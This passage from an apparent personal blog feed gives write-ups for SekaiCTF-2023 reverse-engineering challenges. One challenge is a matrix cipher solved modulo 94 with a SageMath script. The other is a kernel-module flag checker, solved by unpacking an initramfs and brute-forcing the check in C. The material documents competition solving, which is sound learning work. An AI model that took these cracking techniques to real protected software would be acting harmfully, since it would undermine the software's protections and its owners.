class="string">&#x27;76&#x27;</span>, <span class="string">&#x27;49&#x27;</span>, <span class="string">&#x27;38&#x27;</span>, <span class="string">&#x27;75&#x27;</span>, <span class="string">&#x27;35&#x27;</span>, <span class="string">&#x27;77&#x27;</span>, <span class="string">&#x27;70&#x27;</span>, <span class="string">&#x27;91&#x27;</span>, <span class="string">&#x27;91&#x27;</span>, <span class="string">&#x27;74&#x27;</span>, <span class="string">&#x27;63&#x27;</span>, <span class="string">&#x27;55&#x27;</span>, <span class="string">&#x27;63&#x27;</span>, <span class="string">&#x27;76&#x27;</span>, <span class="string">&#x27;83&#x27;</span>, <span class="string">&#x27;39&#x27;</span>, <span class="string">&#x27;61&#x27;</span>, <span class="string">&#x27;69&#x27;</span>, <span class="string">&#x27;61&#x27;</span>, <span class="string">&#x27;49&#x27;</span>, <span class="string">&#x27;92&#x27;</span>, <span class="string">&#x27;34&#x27;</span>, <span class="string">&#x27;75&#x27;</span>, <span class="string">&#x27;52&#x27;</span>, <span class="string">&#x27;87&#x27;</span>, <span class="string">&#x27;80&#x27;</span>, <span class="string">&#x27;83&#x27;</span>, <span class="string">&#x27;43&#x27;</span>, <span class="string">&#x27;36&#x27;</span>, <span class="string">&#x27;49&#x27;</span>, <span class="string">&#x27;62&#x27;</span>, <span class="string">&#x27;86&#x27;</span>, <span class="string">&#x27;51&#x27;</span>, <span class="string">&#x27;49&#x27;</span>, <span class="string">&#x27;67&#x27;</span>, <span class="string">&#x27;65&#x27;</span>, <span class="string">&#x27;69&#x27;</span>, <span class="string">&#x27;92&#x27;</span>, <span class="string">&#x27;95&#x27;</span>, <span class="string">&#x27;42&#x27;</span>, <span class="string">&#x27;44&#x27;</span>, <span class="string">&#x27;66&#x27;</span>, <span class="string">&#x27;68&#x27;</span>, <span class="string">&#x27;88&#x27;</span>, <span class="string">&#x27;79&#x27;</span>, <span class="string">&#x27;45&#x27;</span>, <span class="string">&#x27;46&#x27;</span>, <span class="string">&#x27;70&#x27;</span>, <span class="string">&#x27;74&#x27;</span>, <span class="string">&#x27;94&#x27;</span>, <span class="string">&#x27;75&#x27;</span>, <span class="string">&#x27;50&#x27;</span>, <span class="string">&#x27;75&#x27;</span>, <span class="string">&#x27;77&#x27;</span>, <span class="string">&#x27;66&#x27;</span>, <span class="string">&#x27;66&#x27;</span>, <span class="string">&#x27;48&#x27;</span>, <span class="string">&#x27;39&#x27;</span>, <span class="string">&#x27;58&#x27;</span>, <span class="string">&#x27;73&#x27;</span>, <span class="string">&#x27;65&#x27;</span>, <span class="string">&#x27;66&#x27;</span>, <span class="string">&#x27;63&#x27;</span>, <span class="string">&#x27;77&#x27;</span>, <span class="string">&#x27;56&#x27;</span>, <span class="string">&#x27;80&#x27;</span>, <span class="string">&#x27;85&#x27;</span>, <span class="string">&#x27;57&#x27;</span>, <span class="string">&#x27;79&#x27;</span>, <span class="string">&#x27;58&#x27;</span>, <span class="string">&#x27;78&#x27;</span>, <span class="string">&#x27;64&#x27;</span>, <span class="string">&#x27;37&#x27;</span>, <span class="string">&#x27;78&#x27;</span>, <span class="string">&#x27;75&#x27;</span>, <span class="string">&#x27;90&#x27;</span>, <span class="string">&#x27;78&#x27;</span>, <span class="string">&#x27;49&#x27;</span>, <span class="string">&#x27;76&#x27;</span>, <span class="string">&#x27;79&#x27;</span>, <span class="string">&#x27;68&#x27;</span>, <span class="string">&#x27;82&#x27;</span>, <span class="string">&#x27;76&#x27;</span>, <span class="string">&#x27;87&#x27;</span>, <span class="string">&#x27;82&#x27;</span>, <span class="string">&#x27;73&#x27;</span>, <span class="string">&#x27;52&#x27;</span>, <span class="string">&#x27;46&#x27;</span>, <span class="string">&#x27;93&#x27;</span>, <span class="string">&#x27;36&#x27;</span>, <span class="string">&#x27;34&#x27;</span>, <span class="string">&#x27;41&#x27;</span>, <span class="string">&#x27;94&#x27;</span>, <span class="string">&#x27;55&#x27;</span>, <span class="string">&#x27;42&#x27;</span>, <span class="string">&#x27;58&#x27;</span>, <span class="string">&#x27;54&#x27;</span>, <span class="string">&#x27;37&#x27;</span>, <span class="string">&#x27;40&#x27;</span>, <span class="string">&#x27;76&#x27;</span>, <span class="string">&#x27;90&#x27;</span>, <span class="string">&#x27;95&#x27;</span>, <span class="string">&#x27;40&#x27;</span>, <span class="string">&#x27;75&#x27;</span>]</span><br><span class="line">A = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        tmp.append(int(k[i*<span class="number">16</span>+j]))</span><br><span class="line">    A.append(tmp)</span><br><span class="line">m = [<span class="number">49</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">52</span>]+[<span class="number">88</span>]*<span class="number">12</span></span><br><span class="line">tc = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">    tc.append(rc(i<span class="number">-33</span>))</span><br><span class="line">ans = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        cnt+=A[i][j]*tc[j]</span><br><span class="line">    ans.append(cnt)</span><br><span class="line">print(ans)</span><br><span class="line"><span class="comment">#[49660, 51005, 46594, 54147, 53989, 50070, 52659, 47131, 55795, 50172, 50164, 50815, 53847, 53367, 56021, 48559]</span></span><br></pre></td></tr></table></figure><p>the round 0 is true(49660) ,but the round 1 is 49860, and the round 2 is 51005(true)</p><p><img src="https://s2.loli.net/2023/08/30/8FlHQ3PrhDmb41a.png" alt="image-20230830000708814"></p><p>It seems we get true ans in even round.Why?</p><p>It is because we translate A by 1&lt;&lt;6 =64 bytes offset (which is 8 elements),not 16 elements</p><p><img src="https://s2.loli.net/2023/08/30/o8uwOmPUCHqVhpG.png" alt="image-20230830001233694"></p><p><img src="https://s2.loli.net/2023/08/30/Oelsd3Tf6nGhKCI.png" alt="image-20230830001212087"></p><p>it doesn’t matter because you can know we store  0x80 bytes one time (which is) and we only use the first part.</p><p><img src="https://s2.loli.net/2023/08/30/pORiP7XkG3KgIfM.png" alt="image-20230830001452083"></p><h4 id="mul-sub-add"><a href="#mul-sub-add" class="headerlink" title="mul,sub,add"></a>mul,sub,add</h4><p>for the mul function,you can just read the code and will find that there are a lot of junk code.All it does is just mul two numbers and send the answer to<code>xmm0</code>. Or you can debug it without read the asm code</p><p><img src="https://s2.loli.net/2023/08/30/tyazfYsORGS1ZCl.png" alt="image-20230830001956776"></p><p>the <code>xmm1</code> is setted by <code>vmovss  xmm1, cs:dword_20A0</code>,So we can know the <code>dword_20A0</code> is a float -&gt; 0.0106382975 (which is nealy 1/94)</p><p><img src="https://s2.loli.net/2023/08/30/jONH8VBaiLuzYEn.png" alt="image-20230830002200083"></p><p>just 49660*0.0106382975=528.297852</p><p>and by code <code>vcvttss2usi eax, xmm0</code>, the float is round down to 528 and send to <code>xmm1</code></p><p><img src="https://s2.loli.net/2023/08/30/RBU4aPS7XELAQiY.png" alt="image-20230830002339306"></p><p>similarly,We set bp on the second mul and get <code>dword_20A4</code> is 94</p><p><img src="https://s2.loli.net/2023/08/30/CYGDX5oZW39VNuS.png" alt="image-20230830002507418"></p><p>As for the <code>sub</code> and <code>add</code></p><p>It’s just sub and add. If you analysis the AVX code one by one ,you will find the only useful code is the recursion.So it’s just a sub function using recursion.<code>add</code> is the same .</p><p><img src="https://s2.loli.net/2023/08/30/QFI5Xj8rsLTSYPV.png" alt="image-20230830002734307"></p><p>or you can set bp to see how it get  and how it result</p><p><img src="https://s2.loli.net/2023/08/30/NhKsG1xbUoizQTY.png" alt="image-20230830002936915"></p><p><img src="https://s2.loli.net/2023/08/30/gvTiKSBrUEFnRku.png" alt="image-20230830002952450"></p><p>(49660-49632 = 28)</p><p>so the ciphertext is 28+33=61</p><p><img src="https://s2.loli.net/2023/08/30/cDVSyRQ9YTfbeXw.png" alt="image-20230830003111611"></p><p>you can just write the enc code </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span>(<span class="params">m</span>):</span></span><br><span class="line">    tc = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">        tc.append(rc(i<span class="number">-33</span>))</span><br><span class="line">    c = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        cnt = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">            cnt+= A[i][j]*tc[j]</span><br><span class="line">        c.append(cnt)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        to_add = c[i]-int(c[i]*<span class="number">0.0106382975</span>)*<span class="number">94</span>+<span class="number">33</span></span><br><span class="line">        ans.append(to_add)</span><br><span class="line">    <span class="keyword">return</span> c</span><br></pre></td></tr></table></figure><p>you can set bp on the compare code to see if the encrypt code we analysis is true.</p><h3 id="solve-the-problem"><a href="#solve-the-problem" class="headerlink" title="solve the problem"></a>solve the problem</h3><p>haha,It’s a long story for me to say how i solve it.I used to be a CTFer majored in crypto.And the matrix,floating-point errors reminds me of the LWE problem.</p><p>The problem in this challenge can be descrypt as</p><script type="math/tex; mode=display">A\vec{x} - [A\vec{x}*a ]*94 = \vec{b}</script><p>and a is colsed to 1/94.</p><p>I used to solve a problem ,it can descript as</p><script type="math/tex; mode=display">A\vec{x} = \vec{b}</script><p>and $A$ is a float matrix and you can’t find the inverse matrix of $A$ causing by floating point errors,The right method is to construt Lattice and using LLL</p><script type="math/tex; mode=display">\left(\begin{array}{c}    \vec{x},-1\end{array}\right)\begin{pmatrix}    A& E\\    \vec{b}&\vec{0}\end{pmatrix} \approx \left(\begin{array}{c}    \vec{e},\vec{x},0\end{array}\right)</script><p>So,I think I can rewrite the challenge to            </p><script type="math/tex; mode=display">A\vec{x} - (A\vec{x}*a -\vec{err})*94 = \vec{b}</script><p>and construct lattice to solve it.But I soon realize that the $\vec{err}$ is not small enough,may not meed the Minkowski bound .So I try my best to optimize the lattice ,but didn’t work.</p><p>you could see how stupid i was</p><p><img src="https://s2.loli.net/2023/08/30/gkp3nS8jNyOteqa.png" alt="image-20230830005305276"></p><p>After the competition, the second day,I realize that $a-[a/b]*b$ is just$ a \mod b$ </p><p>WHAT THE F**K??? I forget it and overthink it, it’s just a problem to solve $A\vec{x} = \vec{b}$ on $Zmod(94)$</p><p>all the parameter is inter.No float ,No Error</p><p>F**K!</p><p>So the exp can be write rapidly in SageMath</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">c = [  <span class="number">0x2F</span>, <span class="number">0x4D</span>, <span class="number">0x3D</span>, <span class="number">0x6C</span>, <span class="number">0x64</span>, <span class="number">0x44</span>, <span class="number">0x4C</span>, <span class="number">0x63</span>, <span class="number">0x50</span>, <span class="number">0x6B</span>, </span><br><span class="line">  <span class="number">0x57</span>, <span class="number">0x52</span>, <span class="number">0x2A</span>, <span class="number">0x38</span>, <span class="number">0x73</span>, <span class="number">0x3C</span>, <span class="number">0x46</span>, <span class="number">0x23</span>, <span class="number">0x2F</span>, <span class="number">0x3D</span>, </span><br><span class="line">  <span class="number">0x5C</span>, <span class="number">0x54</span>, <span class="number">0x49</span>, <span class="number">0x4A</span>, <span class="number">0x3D</span>, <span class="number">0x2A</span>, <span class="number">0x62</span>, <span class="number">0x5C</span>, <span class="number">0x29</span>, <span class="number">0x75</span>, </span><br><span class="line">  <span class="number">0x59</span>, <span class="number">0x34</span>, <span class="number">0x2D</span>, <span class="number">0x47</span>, <span class="number">0x25</span>, <span class="number">0x4F</span>, <span class="number">0x22</span>, <span class="number">0x46</span>, <span class="number">0x45</span>, <span class="number">0x63</span>, </span><br><span class="line">  <span class="number">0x74</span>, <span class="number">0x22</span>, <span class="number">0x47</span>, <span class="number">0x69</span>, <span class="number">0x5B</span>, <span class="number">0x7D</span>, <span class="number">0x7B</span>, <span class="number">0x4A</span>, <span class="number">0x48</span>, <span class="number">0x3E</span>, </span><br><span class="line">  <span class="number">0x5B</span>, <span class="number">0x79</span>, <span class="number">0x43</span>, <span class="number">0x60</span>, <span class="number">0x42</span>, <span class="number">0x61</span>, <span class="number">0x66</span>, <span class="number">0x30</span>, <span class="number">0x70</span>, <span class="number">0x7D</span>, </span><br><span class="line">  <span class="number">0x28</span>, <span class="number">0x3D</span>, <span class="number">0x2D</span>, <span class="number">0x74</span>, <span class="number">0x00</span>]</span><br><span class="line">A = [[<span class="number">55</span>, <span class="number">81</span>, <span class="number">66</span>, <span class="number">68</span>, <span class="number">86</span>, <span class="number">67</span>, <span class="number">51</span>, <span class="number">34</span>, <span class="number">88</span>, <span class="number">43</span>, <span class="number">44</span>, <span class="number">70</span>, <span class="number">65</span>, <span class="number">51</span>, <span class="number">93</span>, <span class="number">54</span>], [<span class="number">73</span>, <span class="number">45</span>, <span class="number">54</span>, <span class="number">35</span>, <span class="number">82</span>, <span class="number">59</span>, <span class="number">67</span>, <span class="number">84</span>, <span class="number">87</span>, <span class="number">46</span>, <span class="number">69</span>, <span class="number">46</span>, <span class="number">46</span>, <span class="number">80</span>, <span class="number">79</span>, <span class="number">51</span>], [<span class="number">39</span>, <span class="number">50</span>, <span class="number">57</span>, <span class="number">67</span>, <span class="number">51</span>, <span class="number">68</span>, <span class="number">61</span>, <span class="number">32</span>, <span class="number">79</span>, <span class="number">48</span>, <span class="number">35</span>, <span class="number">90</span>, <span class="number">63</span>, <span class="number">69</span>, <span class="number">66</span>, <span class="number">52</span>], [<span class="number">70</span>, <span class="number">55</span>, <span class="number">64</span>, <span class="number">40</span>, <span class="number">52</span>, <span class="number">84</span>, <span class="number">79</span>, <span class="number">77</span>, <span class="number">51</span>, <span class="number">60</span>, <span class="number">74</span>, <span class="number">57</span>, <span class="number">95</span>, <span class="number">78</span>, <span class="number">93</span>, <span class="number">41</span>], [<span class="number">70</span>, <span class="number">77</span>, <span class="number">58</span>, <span class="number">78</span>, <span class="number">68</span>, <span class="number">83</span>, <span class="number">49</span>, <span class="number">37</span>, <span class="number">90</span>, <span class="number">53</span>, <span class="number">61</span>, <span class="number">91</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">95</span>, <span class="number">58</span>], [<span class="number">71</span>, <span class="number">64</span>, <span class="number">91</span>, <span class="number">90</span>, <span class="number">87</span>, <span class="number">57</span>, <span class="number">53</span>, <span class="number">75</span>, <span class="number">48</span>, <span class="number">68</span>, <span class="number">48</span>, <span class="number">69</span>, <span class="number">73</span>, <span class="number">63</span>, <span class="number">47</span>, <span class="number">51</span>], [<span class="number">63</span>, <span class="number">49</span>, <span class="number">74</span>, <span class="number">50</span>, <span class="number">52</span>, <span class="number">95</span>, <span class="number">32</span>, <span class="number">83</span>, <span class="number">65</span>, <span class="number">85</span>, <span class="number">66</span>, <span class="number">53</span>, <span class="number">85</span>, <span class="number">74</span>, <span class="number">42</span>, <span class="number">81</span>], [<span class="number">33</span>, <span class="number">46</span>, <span class="number">63</span>, <span class="number">85</span>, <span class="number">39</span>, <span class="number">80</span>, <span class="number">89</span>, <span class="number">50</span>, <span class="number">62</span>, <span class="number">70</span>, <span class="number">47</span>, <span class="number">70</span>, <span class="number">39</span>, <span class="number">56</span>, <span class="number">54</span>, <span class="number">61</span>], [<span class="number">67</span>, <span class="number">36</span>, <span class="number">84</span>, <span class="number">70</span>, <span class="number">91</span>, <span class="number">58</span>, <span class="number">68</span>, <span class="number">87</span>, <span class="number">33</span>, <span class="number">77</span>, <span class="number">91</span>, <span class="number">88</span>, <span class="number">87</span>, <span class="number">46</span>, <span class="number">66</span>, <span class="number">67</span>], [<span class="number">60</span>, <span class="number">80</span>, <span class="number">35</span>, <span class="number">79</span>, <span class="number">69</span>, <span class="number">45</span>, <span class="number">54</span>, <span class="number">79</span>, <span class="number">76</span>, <span class="number">49</span>, <span class="number">38</span>, <span class="number">75</span>, <span class="number">35</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">91</span>], [<span class="number">91</span>, <span class="number">74</span>, <span class="number">63</span>, <span class="number">55</span>, <span class="number">63</span>, <span class="number">76</span>, <span class="number">83</span>, <span class="number">39</span>, <span class="number">61</span>, <span class="number">69</span>, <span class="number">61</span>, <span class="number">49</span>, <span class="number">92</span>, <span class="number">34</span>, <span class="number">75</span>, <span class="number">52</span>], [<span class="number">87</span>, <span class="number">80</span>, <span class="number">83</span>, <span class="number">43</span>, <span class="number">36</span>, <span class="number">49</span>, <span class="number">62</span>, <span class="number">86</span>, <span class="number">51</span>, <span class="number">49</span>, <span class="number">67</span>, <span class="number">65</span>, <span class="number">69</span>, <span class="number">92</span>, <span class="number">95</span>, <span class="number">42</span>], [<span class="number">44</span>, <span class="number">66</span>, <span class="number">68</span>, <span class="number">88</span>, <span class="number">79</span>, <span class="number">45</span>, <span class="number">46</span>, <span class="number">70</span>, <span class="number">74</span>, <span class="number">94</span>, <span class="number">75</span>, <span class="number">50</span>, <span class="number">75</span>, <span class="number">77</span>, <span class="number">66</span>, <span class="number">66</span>], [<span class="number">48</span>, <span class="number">39</span>, <span class="number">58</span>, <span class="number">73</span>, <span class="number">65</span>, <span class="number">66</span>, <span class="number">63</span>, <span class="number">77</span>, <span class="number">56</span>, <span class="number">80</span>, <span class="number">85</span>, <span class="number">57</span>, <span class="number">79</span>, <span class="number">58</span>, <span class="number">78</span>, <span class="number">64</span>], [<span class="number">37</span>, <span class="number">78</span>, <span class="number">75</span>, <span class="number">90</span>, <span class="number">78</span>, <span class="number">49</span>, <span class="number">76</span>, <span class="number">79</span>, <span class="number">68</span>, <span class="number">82</span>, <span class="number">76</span>, <span class="number">87</span>, <span class="number">82</span>, <span class="number">73</span>, <span class="number">52</span>, <span class="number">46</span>], [<span class="number">93</span>, <span class="number">36</span>, <span class="number">34</span>, <span class="number">41</span>, <span class="number">94</span>, <span class="number">55</span>, <span class="number">42</span>, <span class="number">58</span>, <span class="number">54</span>, <span class="number">37</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">90</span>, <span class="number">95</span>, <span class="number">40</span>, <span class="number">75</span>]]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rev_rc</span>(<span class="params">x</span>):</span></span><br><span class="line"><span class="keyword">return</span> ((x&amp;<span class="number">0xf0</span>)|((((x&amp;<span class="number">0xf</span>)&gt;&gt;<span class="number">3</span>)|((x&amp;<span class="number">0xf</span>)&lt;&lt;<span class="number">1</span>))&amp;<span class="number">15</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(c)):</span><br><span class="line">    c[i]-=<span class="number">33</span></span><br><span class="line">M = Matrix(Zmod(<span class="number">94</span>),A)</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(c)<span class="number">-16</span>,<span class="number">16</span>):</span><br><span class="line">    b = vector(Zmod(<span class="number">94</span>),c[i:i+<span class="number">16</span>])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> M.solve_right(b):</span><br><span class="line">        flag +=chr(rev_rc(int(i))+<span class="number">33</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/08/30/vesfzUGKDiRMJuy.png" alt="image-20230830010156428"></p><h2 id="Guardians-of-the-Kernel"><a href="#Guardians-of-the-Kernel" class="headerlink" title="Guardians of the Kernel"></a>Guardians of the Kernel</h2><h3 id="description-1"><a href="#description-1" class="headerlink" title="description"></a>description</h3><p><img src="https://s2.loli.net/2023/08/30/Ya3Uw5uAkzsOtyP.png" alt="image-20230830202713264"></p><h3 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h3><p>Like what we do on kernel pwn,just unpack the <code>initramfs.cpio.gz</code> and <code>cpio -idmv &lt; ../xxx.cpio</code> and you will get a file system.</p><p>And there is two part of the flag.just burst it</p><p><img src="https://s2.loli.net/2023/08/30/Tz2wXi9BfRlkJpo.png" alt="image-20230830203008345"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _DWORD uint32_t</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt; <span class="title">T</span> __<span class="title">ROL__</span>(<span class="title">T</span> <span class="title">value</span>, <span class="title">int</span> <span class="title">count</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">const</span> uint nbits = <span class="keyword">sizeof</span>(T) * <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( count &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    count %= nbits;</span><br><span class="line">    T high = value &gt;&gt; (nbits - count);</span><br><span class="line">    <span class="keyword">if</span> ( T(<span class="number">-1</span>) &lt; <span class="number">0</span> ) <span class="comment">// signed value</span></span><br><span class="line">      high &amp;= ~((T(<span class="number">-1</span>) &lt;&lt; count));</span><br><span class="line">    value &lt;&lt;= count;</span><br><span class="line">    value |= high;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    count = -count % nbits;</span><br><span class="line">    T low = value &lt;&lt; (nbits - count);</span><br><span class="line">    value &gt;&gt;= count;</span><br><span class="line">    value |= low;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">inline</span> <span class="keyword">uint32_t</span> __ROL4__(<span class="keyword">uint32_t</span> value, <span class="keyword">int</span> count) &#123; <span class="keyword">return</span> __ROL__((<span class="keyword">uint32_t</span>)value, count); &#125;</span><br><span class="line"><span class="keyword">inline</span> <span class="keyword">uint32_t</span> __ROR4__(<span class="keyword">uint32_t</span> value, <span class="keyword">int</span> count) &#123; <span class="keyword">return</span> __ROL__((<span class="keyword">uint32_t</span>)value, -count); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">enc</span><span class="params">(<span class="keyword">char</span>* buffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> *v6; <span class="comment">// rax</span></span><br><span class="line">    <span class="keyword">int</span> v7; <span class="comment">// edx</span></span><br><span class="line">    <span class="keyword">int</span> v8; <span class="comment">// eax</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">      v6 = (<span class="keyword">uint8_t</span>*)buffer;</span><br><span class="line">      <span class="keyword">while</span> ( (<span class="keyword">uint8_t</span>)(*v6 - <span class="string">&#x27;0&#x27;</span>) &lt;= <span class="number">9u</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">uint8_t</span>*)&amp;buffer[<span class="number">7</span>] == ++v6 )</span><br><span class="line">        &#123;</span><br><span class="line">          v7 = <span class="number">7</span> * __ROL4__(<span class="number">1507359807</span> * __ROR4__(<span class="number">422871738</span> * *(_DWORD *)buffer, <span class="number">15</span>), <span class="number">11</span>);</span><br><span class="line">          v8 = __ROR4__(<span class="number">422871738</span> * ((buffer[<span class="number">5</span>] &lt;&lt; <span class="number">8</span>) ^ (buffer[<span class="number">6</span>] &lt;&lt; <span class="number">16</span>) ^ buffer[<span class="number">4</span>]), <span class="number">15</span>);</span><br><span class="line">          v9 = <span class="number">0x764521F9</span></span><br><span class="line">             * ((v7 + <span class="number">1204333666</span>) ^ (<span class="number">1507359807</span> * v8) ^ <span class="number">7</span> ^ (((v7 + <span class="number">1204333666</span>) ^ (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="number">1507359807</span> * v8)) &gt;&gt; <span class="number">16</span>));</span><br><span class="line">          <span class="keyword">if</span> ( (((<span class="number">-1817436554</span> * ((v9 &gt;&gt; <span class="number">13</span>) ^ v9)) &gt;&gt; <span class="number">16</span>) ^ (<span class="number">-1817436554</span> * ((v9 &gt;&gt; <span class="number">13</span>) ^ v9))) != <span class="number">261736481</span> )</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// int fd = open(&quot;/proc/Flag-Checker&quot;,2);</span></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">7</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// printf(&quot;%d&quot;,ioctl(fd,0x7000,&quot;SEKAI&#123;&quot;));</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">long</span> <span class="keyword">long</span> i=<span class="number">0</span>;i&lt;<span class="number">10000000</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">7</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(buf,<span class="string">&quot;%lld&quot;</span>,i);</span><br><span class="line">        <span class="keyword">if</span>(enc(buf)==<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,buf);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// printf(&quot;%s\n&quot;,buf);</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>this part is also easy,just reverse,which is <code>c[i] -=c[i+1]*~i</code></p><p><img src="https://s2.loli.net/2023/08/30/rYNAQdbgIkFU4xs.png" alt="image-20230830203137066"></p><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;last weekend , I take part in the SekaiCTF-2023 and solve some easy challenges.On the last day night, I spend most of time on the challen</summary>
      
    
    
    
    
    <category term="pwn" scheme="http://phot0n.com/tags/pwn/"/>
    
    <category term="reverse" scheme="http://phot0n.com/tags/reverse/"/>
    
    <category term="writeup" scheme="http://phot0n.com/tags/writeup/"/>
